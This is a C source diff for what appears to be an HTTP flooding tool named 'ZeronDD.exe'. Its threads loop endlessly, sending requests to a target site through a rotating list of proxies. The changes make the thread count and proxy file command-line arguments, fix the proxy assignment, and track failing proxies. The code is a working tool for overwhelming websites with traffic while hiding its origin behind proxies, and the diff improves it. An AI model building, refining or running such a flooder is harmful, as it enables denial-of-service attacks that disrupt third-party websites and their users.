@@ -8,14 +8,18 @@
 #include "proxy.h"
 #include "http.h"
 
-
-#define THREADS_COUNT 		(300)
-
 static pthread_mutex_t 	mutex;
 static int 				thread_proxy_index = 0;
 static Proxy 			*proxy_list;
 static int 				proxy_list_size = 0;
 static unsigned char 	*proxy_failed;
+
+#define MUTEX(CODE) 						\
+	pthread_mutex_lock(&mutex);				\
+	{										\
+		CODE 								\
+	}										\
+	pthread_mutex_unlock(&mutex);
 
 void *task(void *userdata)
 {
@@ -28,22 +32,20 @@ void *task(void *userdata)
 
 	id = (int) userdata;
 	HTTP_Create(&http, id);
-	#if 1
-	HTTP_SetVerbose(http, false);
+	#if 0
+	HTTP_SetVerbose(http, true);
 	#endif
 	while (1)
 	{
-		pthread_mutex_lock(&mutex);
-
-		if (thread_proxy_index >= proxy_list_size)
-		{
-			thread_proxy_index = 0;
-			usleep(100);
-		}
-
-		proxy_index = thread_proxy_index;
-		thread_proxy_index++;
-		pthread_mutex_unlock(&mutex);
+		MUTEX(
+			if (thread_proxy_index >= proxy_list_size)
+			{
+				thread_proxy_index = 0;
+				usleep(100);
+			}
+			proxy_index = thread_proxy_index;
+			thread_proxy_index++;
+		)
 
 		if (proxy_failed[proxy_index] > 4)
 		{
@@ -52,13 +54,18 @@ void *task(void *userdata)
 
 		proxy = &proxy_list[proxy_index];
 		HTTP_SetURL(http, proxy->target_site);
+		HTTP_SetProxy(http, proxy->ip, proxy->user_password);
 		http_code = HTTP_Request(http);
-		if ((http_code == 0) || (http_code >= 300))
+		if ((http_code == 0) || (http_code >= 400))
 		{
-			HTTP_SetProxy(http, proxy->ip, proxy->user_password);
+			proxy_failed[proxy_index]++;
 		}
 		else
 		{
+			MUTEX(
+				if (proxy_failed[proxy_index] > 0)
+					proxy_failed[proxy_index]--;
+			)
 			printf("[%s] SUCCESS\n", proxy->target_site);
 		}
 
@@ -130,35 +137,49 @@ START:
 #endif
 
 
-int main(void)
+int main(int argc, char **argv)
 {
 	int i;
-	pthread_t threads_list[THREADS_COUNT];
+	unsigned int threads_count;
+	pthread_t *threads_list;
+	char *proxies_file_path = NULL;
 
+
+	if (argc < 3)
+	{
+		printf("Usage: ZeronDD.exe [threads_count] [path_to_proxies]\n");
+		return 0;
+	}
+
+	threads_count = atoi(argv[1]);
+	proxies_file_path = argv[2];
+
+	threads_list = malloc(threads_count * sizeof(pthread_t));
 
 	HTTP_ModuleInit();
 	pthread_mutex_init(&mutex, NULL);
 
-	if (!Proxy_Load(&proxy_list, &proxy_list_size))
+	if (!Proxy_Load(proxies_file_path, &proxy_list, &proxy_list_size))
 	{
 		printf("Proxy_Load error\n");
 		return 1;
 	}
 	printf("Read %d proxy\n", proxy_list_size);
-	proxy_failed = malloc(proxy_list_size * sizeof(*proxy_failed));
+	proxy_failed = calloc(proxy_list_size, sizeof(*proxy_failed));
 
-	printf("Start threads\n");
-	for (i = 0; i < THREADS_COUNT; i++)
+	printf("Start %d threads\n", threads_count);
+	for (i = 0; i < threads_count; i++)
 	{
 		pthread_create(threads_list + i, NULL, task, (void *) i);
 	}
 
-	for (i = 0; i < THREADS_COUNT; i++)
+	for (i = 0; i < threads_count; i++)
 	{
 		pthread_join(threads_list[i], NULL);
 	}
 
 	pthread_mutex_destroy(&mutex);
+	free(threads_list);
 	free(proxy_list);
 	HTTP_ModuleFree();
 	
